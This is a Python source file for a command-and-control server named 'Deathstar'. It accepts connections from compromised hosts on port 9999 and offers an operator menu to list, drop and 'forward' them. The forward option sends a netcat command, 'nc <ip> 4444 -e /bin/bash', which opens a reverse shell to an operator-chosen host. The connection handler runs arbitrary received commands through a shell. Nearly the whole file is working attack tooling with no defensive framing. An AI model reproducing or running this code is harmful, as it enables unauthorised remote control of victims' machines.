import socket
import threading
import subprocess
import sys

# Data structures to keep track of connections
connections = {}
connection_id = 1  # Global variable to keep track of connection IDs

def display_connections():
    """Display all active connections."""
    if not connections:
        print("\nNo active connections\n")
        return
    print("")
    print("+---------------------------+")
    print("|     Active Connections    |")
    print("+---------------------------+")
    print("| ID | TGT IP               |")
    print("+---------------------------+")
    for cid, (conn, addr) in connections.items():
        # Adjust spacing to align the columns
        print(f"  {cid:<2} | {addr[0]:<18} ")
    print("+---------------------------+")

def forward_connection():
    """Forward a connection to a new IP."""
    if not connections:
        print("\nNo active connections to forward\n")
        return
    
    display_connections()
    
    try:
        print()  # Blank line before prompt
        cid = int(input("Enter the ID of the connection you want to forward: "))
        if cid not in connections:
            print("\nInvalid connection ID\n")
            return
        
        forward_ip = input("Enter the IP address to forward to: ")
        if not forward_ip:
            print("\nInvalid IP address\n")
            return
        
        conn, addr = connections[cid]
        try:
            command = f"nc {forward_ip} 4444 -e /bin/bash"  # Default to Bash reverse shell
            conn.sendall(command.encode('utf-8') + b'\n')
            print("\nForwarding command sent\n")
        except Exception as e:
            print(f"\nError: {e}\n")
    except ValueError:
        print("\nInvalid ID input\n")

def drop_connection():
    """Drop a connection."""
    if not connections:
        print("\nNo active connections to drop\n")
        return
    
    display_connections()
    
    try:
        print()  # Blank line before prompt
        cid = int(input("Enter the ID of the connection you want to drop: "))
        if cid not in connections:
            print("\nInvalid connection ID\n")
            return
        
        conn, addr = connections[cid]
        conn.close()
        del connections[cid]  # Ensure the correct ID is deleted
        print(f"\nDropped connection: {addr[0]}\n")
    except ValueError:
        print("\nInvalid ID input\n")
    except KeyError:
        print("\nConnection ID not found\n")

def handle_reverse_shell(client_socket, client_address):
    global connection_id
    print(f"\nNew Connection: {client_address[0]}\n")  # Notify about the new connection
    connections[connection_id] = (client_socket, client_address)
    connection_id += 1
    buffer = b""

    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break
            buffer += data
            # Process received data (assuming commands are ended with a newline)
            while b'\n' in buffer:
                command, buffer = buffer.split(b'\n', 1)
                # Execute command and send result back to the client
                try:
                    result = subprocess.run(command.decode('utf-8'), shell=True, capture_output=True)
                    client_socket.sendall(result.stdout + result.stderr)
                except Exception as e:
                    client_socket.sendall(f"Error: {e}".encode('utf-8'))
        except Exception:
            break
    
    client_socket.close()
    if connection_id - 1 in connections:
        addr = connections[connection_id - 1][1]
        del connections[connection_id - 1]
        print(f"\nDropped connection: {addr[0]}\n")
    else:
        print(f"\nConnection ID {connection_id - 1} was not found\n")

def start_c2_server():
    """Start the C2 server."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print("C2 server listening on port 9999")

    while True:
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_reverse_shell, args=(client_socket, client_address)).start()

def main_menu():
    """Display the main menu and handle user choices."""
    while True:
        print("")
        print("+---------------------------+")
        print("|         Deathstar         |")
        print("+---------------------------+")
        print("| 1 | Show connections      |")
        print("| 2 | Forward a connection  |")
        print("| 3 | Drop a connection     |")
        print("| 0 | Quit Deathstar        |")
        print("+---------------------------+")
        print()
        
        try:
            choice = input("Enter your choice: ")
            
            if choice == '1':
                display_connections()
            elif choice == '2':
                forward_connection()
            elif choice == '3':
                drop_connection()
            elif choice == '0':
                print("Exiting Deathstar...")
                break
            else:
                print("\nInvalid choice, please try again\n")
        
        except KeyboardInterrupt:
            print("\n\nReturning to the main menu\n")

if __name__ == '__main__':
    threading.Thread(target=start_c2_server, daemon=True).start()  # Start the C2 server in the background
    main_menu()  # Run the terminal menu
